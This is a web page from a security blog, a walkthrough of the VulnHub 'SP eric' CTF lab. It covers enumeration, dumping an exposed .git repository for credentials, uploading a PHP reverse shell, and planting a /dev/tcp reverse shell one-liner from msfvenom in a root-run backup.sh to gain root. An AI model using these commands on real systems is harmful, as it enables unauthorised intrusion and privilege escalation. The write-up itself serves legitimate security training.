@@ -1,0 +1,89 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
+            <h1 class="post-title entry-title">SP eric: Vulnhub Lab Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/sp-eric-vulnhub-lab-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2019-04-17T15:06:13+00:00">April 17, 2019</time><time class="updated" datetime="2025-06-10T20:11:45+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Hello friends! Today we are going to take another CTF challenge known as “SP eric”. The credit for making this VM machine goes to “Daniel Solstad”. Our goal is to get 2 flags to complete the challenge.</span></p>
+<p><span style="color: #000000;">They are located at:</span></p>
+<p><strong><span style="color: #000000;">/root/flag.txt</span></strong></p>
+<p><strong><span style="color: #000000;">/home/eric/flag.txt</span></strong></p>
+<p><span style="color: #000000;">You can download this VM <a style="color: #000000;" href="https://www.vulnhub.com/entry/sp-eric,274/"><span style="color: #0000ff;"><strong>here</strong></span></a>.</span></p>
+<p><span style="color: #000000;">Security Level: Beginner</span></p>
+<p><span style="color: #000000;"><strong>Penetrating Methodology:</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Network scanning (Nmap)</span></li>
+<li><span style="color: #000000;">Surfing HTTP service port</span></li>
+<li><span style="color: #000000;">Enumerating directories using Dirb</span></li>
+<li><span style="color: #000000;">Dumping git files using gitdumper</span></li>
+<li><span style="color: #000000;">Extracting git file using Extractor</span></li>
+<li><span style="color: #000000;">Enumerating for Login Credentials</span></li>
+<li><span style="color: #000000;">Uploading PHP reverse shell</span></li>
+<li><span style="color: #000000;">Getting user flag</span></li>
+<li><span style="color: #000000;">Editing the file with a php shell</span></li>
+<li><span style="color: #000000;">Getting the root flag</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Walkthrough </strong></span></p>
+<p><span style="color: #000000;">We will start the cracking of this CTF with a port scan using nmap. Through the nmap scan, we get that we have the port 80 open. Also as we can see in the given image that we have also discovered the .git directory.</span></p>
+<pre class="lang:default decode:true">nmap -A 192.168.1.18</pre>
+<p><img decoding="async" src="//4.bp.blogspot.com/-2wY5w_k7ia0/XLc1q05G-VI/AAAAAAAAeDY/_TcR7ttS4aUjmUugFbhqzJ9BP6-u4dpzACLcBGAs/s1600/1.png"/></p>
+<p><span style="color: #000000;">By convention, if we have the port 80, we try and open the IP Address in the Web Browser. In doing so we see a message of “Blog under construction”. This seems like a Dead End. Let’s try another approach.</span></p>
+<p><img decoding="async" src="//3.bp.blogspot.com/-tgjIjYZgbwQ/XLc1srEXkJI/AAAAAAAAeDs/zbQp0KcgJRAGeOVlgF4OIdvrpmCxJkK-ACLcBGAs/s1600/2.png"/></p>
+<p><span style="color: #000000;">We ran a directory bruteforce using the dirb tool. This revealed the admin.php, index.php and a directory named “upload”. We will try to discover all these to enumerate as much as we can.</span></p>
+<pre class="lang:default decode:true">dirb //192.168.1.18</pre>
+<p><img decoding="async" src="//1.bp.blogspot.com/-c8l5Jmnp050/XLc1tCW0XrI/AAAAAAAAeD4/wDaZVnVDdQIdBcoEJ_-ORx1046Z9lqwYgCLcBGAs/s1600/3.png"/></p>
+<p><span style="color: #000000;">On opening the admin.php, we get a form with the Username and Password fields. Seeing a form, our basic instinct was the SQL Injections. We spent a little time on that, then we took the advice of author that there is no use of Bruteforcing. We will have to figure our some another way.  </span></p>
+<p><img decoding="async" src="//1.bp.blogspot.com/-8Ocs8L9GGN4/XLc1tLVHeLI/AAAAAAAAeD0/uQZ22VWa3EkzS8W7d-xHXOm9HxWQZ-4fwCLcBGAs/s1600/4.png"/></p>
+<p><span style="color: #000000;">Now, back on the nmap scan, we did in the beginning. We found a Git repository. On browsing a few sites on Google, we found this epic tool called GitTools. We cloned this tool on our Desktop as shown in the given image. After that, we traversed in the GitTools Directory to using the cd command. Here, we found 3 tools: Dumper, Extractor, Finder. We will use this tool to enumerate this git.</span></p>
+<pre class="lang:default decode:true">git clone <a href="https://github.com/internetwache/GitTools">https://github.com/internetwache/GitTools.git</a>
+cd GitTools/
+ls</pre>
+<p><img decoding="async" src="//3.bp.blogspot.com/-FMENW2ciEPE/XLc1ta99fdI/AAAAAAAAeD8/92uH3jFjNx867ecosQeMbupKwTmV66KkgCLcBGAs/s1600/5.png"/></p>
+<p><span style="color: #000000;">First, we traversed into the Dumper directory to use the gitdumper tool. This tool will dump all the files on the git. We will have to give a destination directory to use it. This tool can be used as shown in the given image.</span></p>
+<pre class="lang:default decode:true ">./gitdumper.sh http://192.168.1.18/.git/ dest-dir</pre>
+<p><img decoding="async" src="//2.bp.blogspot.com/-DwWEs5zxaCk/XLc1uLKlMLI/AAAAAAAAeEA/-bTR7p15xtUtfjXOgaOIELOnBfP8lpS1ACLcBGAs/s1600/6.png"/></p>
+<p><span style="color: #000000;">Now that we have successfully dumped the git files using the gitdumper tool. It’s time to use the Extractor tool. For this, we will have to traverse inside the Extractor directory within the GitTools. Now to use the extractor we will have to give the path of the destination directory in with we dumped the git files using the gitdumper.</span></p>
+<p><img decoding="async" src="//1.bp.blogspot.com/-Z-xTjJOhwyI/XLc1uEwHYwI/AAAAAAAAeEE/dM5uxZA78H4MH9n6RgEGRD4AdVWgK-XFQCLcBGAs/s1600/7.png"/></p>
+<pre class="lang:default decode:true">./extractor.sh ../Dumper/dest-dir ./dest-dir</pre>
+<p><span style="color: #000000;"> The Extractor tool will create the directories based on the commits on the git that we dumped earlier which can be observed in the given image. Three directories were created in response to three commits on the git. We traversed in the directory named “0-3db5628b550f5c9c9f6f663cd158374035a6eaa0/” to find three file: admin.php, commit-meta.txt and index.php. We read the admin.php file using the cat command to find the username and password for the form we found earlier. We made a note of these credentials.</span></p>
+<pre class="lang:default decode:true ">ls
+cd 0-3db5628b550f5c9c9f6f663cd158374035a6eaa0/
+ls
+cat admin.php</pre>
+<p><img decoding="async" src="//2.bp.blogspot.com/-vHHSTYHyXog/XLc1udRmRbI/AAAAAAAAeEI/hoHOexgCP3gJcOxVwFOCUoL4neClBOI8QCLcBGAs/s1600/8.png"/></p>
+<p><span style="color: #000000;">We went back to the admin form we discovered earlier and entered the login credentials we found in the git. This was a successful login. Upon logging in we found more forms, titled: Add new post and Add site to blogroll. Here, we found an Upload option. </span></p>
+<p><img decoding="async" src="//4.bp.blogspot.com/-XLbRP6ATaXU/XLc1ukXnjXI/AAAAAAAAeEM/SSgIgoIcMm8IbRozwandtdPZqrvt2uT3ACLcBGAs/s1600/9.png"/></p>
+<p><span style="color: #000000;">So, we entered the necessary information in the various field on the page and selected a php reverse shell in the location of uploading the file. After all the entries filled, we clicked on the add button to upload the file with this entry.</span></p>
+<p><img decoding="async" src="//4.bp.blogspot.com/-7W9-tMdfqOU/XLc1qnGHPQI/AAAAAAAAeDU/_lqKkHgofREm5EGu-30KmR9qBuiYjJc6ACLcBGAs/s1600/10.png"/></p>
+<p><span style="color: #000000;">Even though the file was successfully uploaded, to get the session, we will have to execute the file on the target machine. Back to the nmap scan, we found a directory called “upload”. It’s time to get to that directory. We used the name of the php file we uploaded to execute the file on the target system as shown in the given image.</span></p>
+<p><img decoding="async" src="//4.bp.blogspot.com/-4zW05vhh0NM/XLc1qWxmfDI/AAAAAAAAeDQ/9ASYWwP7gO0Wl_nhhdlAHaAhx2noafvLACLcBGAs/s1600/11.png"/></p>
+<p><span style="color: #000000;">On the other side, in a new terminal, we created a netcat listener at the port that we mentioned the php reverse shell script. Upon Execution, we got the shell of the target system. To get a proper shell, we used the python one-liner. After getting the proper shell, we used the ls command to enumerate for the flag. We traversed in the eric directory. Here we found the 1<sup>st</sup> flag as shown in the given image. We also found a file named backup.sh. As we can see in the given image that the backup.sh file has all the permission required and it runs as root.</span></p>
+<pre class="lang:default decode:true">nc -lvp 1234
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+cd /home
+ls -al
+cd eric
+ls -al
+cat flag.txt</pre>
+<p><img decoding="async" src="//3.bp.blogspot.com/-HnDTYG3V3Pw/XLc1rdqc7uI/AAAAAAAAeDc/3rY6zXzT8gIyrzugVz_lA8BuzfffBiX0ACLcBGAs/s1600/12.png"/></p>
+<p><span style="color: #000000;">So, we have to target the backup.sh file to get the root shell on the target machine. We created a msfvenom script to exploit the target machine. We used the reverse_bash payload to create this script.</span></p>
+<pre class="lang:default decode:true">msfvenom -p cmd/unix/reverse_bash lhost=192.168.1.4 lport=4455 R</pre>
+<p><img decoding="async" src="//4.bp.blogspot.com/-DcC7znIode4/XLc1ri9gwFI/AAAAAAAAeDg/iuJfzXA_x5ADrgm3p7bmsxCZegAKBfgtgCLcBGAs/s1600/13.png"/></p>
+<p><span style="color: #000000;">We copied the script contents and then we moved the session we had on the target machine and here we edited the backup.sh file with our script using the echo command.</span></p>
+<pre class="lang:default decode:true">echo "0&lt;&amp;171-;exec 171&lt;&gt;/dev/tcp/192.168.1.4/4455;sh &lt;&amp;171 &gt;&amp;171 2&gt;&amp;171" &gt; backup.sh</pre>
+<pre class="lang:default decode:true">cat backup.sh</pre>
+<p><img decoding="async" src="//2.bp.blogspot.com/-Z3fdApRmusA/XLc1rpz3GZI/AAAAAAAAeDk/EgPVPpXbfuMDayNJH5kqNZqlRBQ7z_EEQCLcBGAs/s1600/14.png"/></p>
+<p><span style="color: #000000;">On a new terminal, we started a netcat listener on the port that we mentioned while creating the script using msfvenom. When we ran the file backup.sh file, we have a root session. Being an improper shell, we improved it using the python one-liner. Here, we traversed in the root directory. We found the root flag here in this directory as shown in the given image.</span></p>
+<pre class="lang:default decode:true">nc -lvp 4455
+id
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+cd /root
+ls
+cat flag.txt</pre>
+<p><img decoding="async" src="//2.bp.blogspot.com/-4wyr2P0zu60/XLc1sBByHKI/AAAAAAAAeDo/kRF9qpYpaHA9SvlVY30ZJoroDGscq4CigCLcBGAs/s1600/15.png"/></p>
+<p><span style="color: #000000;"><strong>Author: Pavandeep Singh</strong> is a Technical Writer, Researcher and Penetration Tester Contact</span> <strong><a href="https://www.linkedin.com/in/pavandeep-singh-6b1074132" target="_blank" rel="noopener noreferrer" data-saferedirecturl="https://www.google.com/url?q=https://www.linkedin.com/in/pavandeep-singh-6b1074132&amp;source=gmail&amp;ust=1542651210170000&amp;usg=AFQjCNEYOzlThg6B1HzKcEZNou4HowCJ2Q">here</a></strong></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
